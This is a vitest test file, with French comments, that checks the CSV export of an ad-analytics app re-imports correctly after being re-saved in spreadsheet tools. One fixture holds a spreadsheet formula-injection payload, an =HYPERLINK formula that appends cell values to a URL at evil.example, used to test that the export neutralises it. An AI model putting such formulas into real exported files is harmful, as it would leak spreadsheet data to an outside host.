import { describe, it, expect, vi, beforeAll } from 'vitest';

const ids = vi.hoisted(() => {
  const { randomUUID } = require('node:crypto') as typeof import('node:crypto');
  return { wsId: randomUUID(), brandId: randomUUID() };
});

vi.mock('@tiktrends/db', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@tiktrends/db')>();
  const { pgMemoire } = await import('./helpers/pg-memoire');
  const db = await pgMemoire(actual.schema as unknown as Record<string, unknown>);
  return { ...actual, db };
});

vi.mock('../lib/adsmap-guard', () => ({
  adsmapGuard: async () => ({
    s: { user: { id: ids.wsId, email: 'admin@test.local', name: null }, workspaceId: ids.wsId, workspaceName: 'Agence', role: 'admin', plan: 'business' },
    brand: { id: ids.brandId, name: 'Marque A', workspaceId: ids.wsId },
  }),
}));

import { db, schema } from '@tiktrends/db';
import { parseCsv, buildImportPlan, SHEET_COLUMNS, COMPUTED_COLUMNS } from '@tiktrends/core';
import { exportAdsCsvAction } from '../app/actions/adsmap';
import { previewImportAction } from '../app/actions/adsmap-import';

/**
 * L'export Résultats se réimporte tel quel · la VRAIE `exportAdsCsvAction`, sur
 * une vraie base (pglite), relue par l'import du noyau et par l'action d'aperçu.
 *
 * Avant correction, l'export sortait au point-virgule et l'import ne lisait que
 * la virgule : chaque ligne tombait dans UNE cellule, toutes les colonnes s'y
 * rabattaient, et l'aperçu montrait une variante dont le concept était la ligne
 * entière (mesuré par la mutation M1). On compare des VALEURS,
 * colonne par colonne : un apprentissage piégé `=HYPERLINK(…)` (neutralisé à
 * l'export, rendu tel quel à l'import), un titre avec `;`, une hypothèse avec
 * `,`, un CPA négatif.
 */
const PIEGE = '=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")';
const COLONNES = [...SHEET_COLUMNS, ...COMPUTED_COLUMNS];

let csv = '';

beforeAll(async () => {
  await db.insert(schema.workspaces).values({ id: ids.wsId, name: 'Agence' });
  await db.insert(schema.brands).values({ id: ids.brandId, workspaceId: ids.wsId, name: 'Marque A' });
  const [persona] = await db.insert(schema.personas).values({ brandId: ids.brandId, name: 'P' }).returning();
  const [desire] = await db.insert(schema.desires).values({ workspaceId: ids.wsId, personaId: persona!.id, label: '+Confiance' }).returning();
  const [angle] = await db.insert(schema.angles).values({ workspaceId: ids.wsId, desireId: desire!.id, label: 'Preuve', mechanism: 'demo' }).returning();
  const [concept] = await db.insert(schema.concepts).values({ workspaceId: ids.wsId, angleId: angle!.id, title: 'Avant; après' }).returning();
  const [ad] = await db.insert(schema.ads).values({ workspaceId: ids.wsId, conceptId: concept!.id, variantCode: 'v1', hypothesis: 'Prix, puis preuve' }).returning();
  await db.insert(schema.verdicts).values({ adId: ad!.id, workspaceId: ids.wsId, computed: 'winner', validated: 'winner', status: 'validated', comparable: true, metricsAgg: { cpa: -12.5, spend: 1234.5, purchases: 3 } });
  await db.insert(schema.learnings).values({ workspaceId: ids.wsId, brandId: ids.brandId, adId: ad!.id, scope: 'ad', statement: PIEGE, status: 'validated' });

  const r = await exportAdsCsvAction({}, true);
  expect(r.error).toBeUndefined();
  csv = r.csv ?? '';
});

/** Lecture brute (apostrophes gardées) · ce qu'un tableur a en main avant de réenregistrer. */
function lireBrut(texte: string, sep: string): string[][] {
  const t = texte.replace(/^﻿/, '');
  const rows: string[][] = [];
  let row: string[] = [], cur = '', q = false;
  for (let k = 0; k < t.length; k++) {
    const c = t[k]!;
    if (q) { if (c === '"') { if (t[k + 1] === '"') { cur += '"'; k++; } else q = false; } else cur += c; continue; }
    if (c === '"') q = true;
    else if (c === sep) { row.push(cur); cur = ''; }
    else if (c === '\n') { row.push(cur); rows.push(row); row = []; cur = ''; }
    else if (c !== '\r') cur += c;
  }
  if (cur || row.length) { row.push(cur); rows.push(row); }
  return rows;
}

/** Réenregistré à la virgule, comme Google Sheets ou Excel hors réglage français. */
const aLaVirgule = (texte: string, bom = false) => (bom ? '﻿' : '')
  + lireBrut(texte, ';').map((r) => r.map((v) => (/[,"\r\n]/.test(v) ? `"${v.split('"').join('"' + '"')}"` : v)).join(',')).join('\r\n') + '\r\n';

/** La valeur d'une colonne, relue par l'import. */
function relu(texte: string, col: string): string {
  const rows = parseCsv(texte);
  const i = rows[0]!.indexOf(col);
  expect(i, `colonne « ${col} » introuvable à la relecture · l'en-tête relu vaut ${JSON.stringify(rows[0]!.slice(0, 2))}`).toBeGreaterThanOrEqual(0);
  return rows[1]![i]!;
}

describe('export Résultats → import · aller-retour sur la vraie action', () => {
  it('le fichier exporté est bien au point-virgule, avec BOM et CRLF (le cas réparé)', () => {
    expect(csv.startsWith('﻿Status;BATCH #;')).toBe(true);
    expect(csv).toContain('\r\n');
  });

  it.each([
    ['tel quel', () => csv],
    ['réenregistré à la virgule (Sheets)', () => aLaVirgule(csv)],
    ['réenregistré à la virgule avec BOM (Excel « CSV UTF-8 »)', () => aLaVirgule(csv, true)],
  ])('%s · l’en-tête et chaque valeur reviennent à l’identique', (_nom, texte) => {
    const rows = parseCsv(texte());
    expect(rows[0], 'l’en-tête relu n’est pas celui de l’export · séparateur, BOM ou « \\r » de fin de ligne').toEqual(COLONNES);
    expect(rows[1], 'la ligne relue n’a pas le nombre de colonnes de l’export').toHaveLength(COLONNES.length);
    expect(relu(texte(), 'Apprentissages'), 'l’apprentissage piégé ne revient pas tel que saisi').toBe(PIEGE);
    expect(relu(texte(), 'Learnings')).toBe(PIEGE);
    expect(relu(texte(), 'Ad Concept'), 'la valeur avec « ; » a été coupée').toBe('Avant; après');
    expect(relu(texte(), "Que testez-vous et qu'est-ce qui vous donne confiance dans le fait que ce test améliorera les performances globales ?"),
      'la valeur avec « , » a été coupée').toBe('Prix, puis preuve');
    expect(relu(texte(), '📎 Désire')).toBe('+Confiance');
    expect(relu(texte(), 'CPA'), 'le CPA négatif ne revient pas').toBe('-12,5');
    expect(relu(texte(), 'Dépense')).toBe('1 234,5');
    expect(relu(texte(), 'Achats'), 'un « \\r » est resté en fin de ligne').toBe('3');
    expect(relu(texte(), 'Résultats')).toBe('Winning Ad');
  });

  it('buildImportPlan · le même plan, tel quel ou réenregistré à la virgule', () => {
    const today = new Date('2026-11-01');
    const plan = buildImportPlan(csv, { today });
    expect(plan.report.rowsRead).toBe(1);
    expect(plan.ads[0]).toMatchObject({ learning: PIEGE, hypothesis: 'Prix, puis preuve', verdict: 'winner' });
    expect(plan.concepts.map((c) => [c.title, c.angleLabel])).toEqual([['Avant; après', 'Preuve']]);
    expect(plan.desires.map((d) => d.label)).toEqual(['+Confiance']);
    expect(buildImportPlan(aLaVirgule(csv), { today })).toEqual(plan);
    expect(buildImportPlan(aLaVirgule(csv, true), { today })).toEqual(plan);
  });

  it('previewImportAction · l’aperçu de l’écran Importer lit l’export tel quel', async () => {
    const r = await previewImportAction(csv);
    expect(r.error, 'l’aperçu refuse l’export repris tel quel').toBeUndefined();
    expect(r.report?.rowsRead).toBe(1);
    expect(r.sample?.[0]).toMatchObject({ concept: 'Avant; après', angle: 'Preuve', desire: '+Confiance', verdict: 'winner' });
  });
});
